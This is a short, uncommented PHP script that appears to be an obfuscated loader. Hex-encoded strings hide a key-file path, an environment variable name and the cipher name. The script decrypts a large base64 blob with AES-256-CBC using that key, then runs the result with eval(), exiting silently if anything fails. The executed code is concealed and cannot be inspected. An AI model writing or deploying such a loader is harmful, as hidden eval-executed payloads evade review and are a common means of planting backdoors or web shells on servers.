<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('O2Xdm0J7tsd2d+b8yxJ8zg==');

$c=base64_decode(

'H8lJ08ueuffJJxOJZZToPtUNyUDU8SNXAO1zoz75kx5mxEuf7VCZhcUXbnmI7M1WdzFA3pKwINCV' .
'766LOtteqy1n1jT+YNnofhPFYnewD9rym5ZTbVqjt1bz93ehvSBFQTe6YVuN04/ymA7Mbtd40eme' .
'E4kT/wcyscyrUpuxLCDyfy30oXOaF8gAick5lI06vVc93qNeP2zexfYhTjlY13OmrCSb2t6jCcAR' .
'lJOtbqwbjmxLRnDBrPtVPdkFpzD57S03Z4x4HsxT/yHBZIDIubXXpGmY8MDogRP6MdovXYTgLJkw' .
'acfpk0TgyPL4f1PvAmjI6u2lylira43FruzXgXFZGhudKUJClrDILHfGXRAI++BUTWFquyfFVpSI' .
'vfzdJ1aIuwBWLxtsHmeaGYfRinC4NQNdac655/ravwKGDl2rCJkxWTv+OVvaMAvb1ZTfs3fQ2e3M' .
'KHayj39ZUHAVtZShqWi7I6X7+R+e3mj4z7aUeB6hwRy+m3qGGZv+pcmei7hYo7/auyWDpsjkAb1j' .
'XlpMihNc31Op2BLkp+mzOuMkeP3sl1rJEXq/5yMzf71O/AsJKCDFP5dbkR340EkBZuMYme9QuCv2' .
'bkW+3li4A44oYcYIc54GxcWyaZ+PxYtvOVEtJUaQlxz9nkUYEshpscAgrOmZUsXhibWCBvOXyE9O' .
'mv87s1RqNOBZ7v2vQwUAx5lGjr1XY7mOnQSbUsipejVYUqCChM+WCzuLamFAFtTIYRtorC1QYBYq' .
'RBQ7Un7Up2+I6MUDaBviq97frg4P2m0tKHD7BaAiMa96GGSZFhG86xcU6zLabskJEpboYH40sH9h' .
'kpnRjgb8e9moyeG42IVMgJLFjwUX9/pSCj14nWTUL7w5xbVB9PrLztNSxTk8KDm0L5zAhxMEX90g' .
'RkFSb0BjEn707+6y56RtLp+2so/i5L3gjdSCaiNiQ+H26AgTgryxCvDGw3Rk+7DmRMaw6cUEesQ5' .
'tvZsK71X+nPl0yqOuIFBNxlatJjW+xLEG4FekRQqJs3cBXRMgQroRk25bFo6PLFkwA+Djjq9VEjY' .
'zyqeu7cUyT+9y+n5cZ+S9JH62IRKHtq2UhE24q94B0skEeBE2BjsHJjFxftrgEQw5dkGM4MjvIY2' .
'3oDcnUBKEdV8DFOSm0f2SNl6x8EqT6uItNzkhUfW/FB5t6A8mfgiVSmVEDkqZgrC3rFFG81Z07uW' .
'11174+F4/f6D7sBF33M8otNrBSP74wlJZiXtaSxfJkxh7m2G/MWFSCvVhWIVILWZyXzJ0Je9QwRR' .
'LAfEXPkav6oTzZy5A80ikZ+0xNuWU0uZtzqjXL6J8IaQg04f7oJ1gh9Z75FmN7pZ9E9yenVf1A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

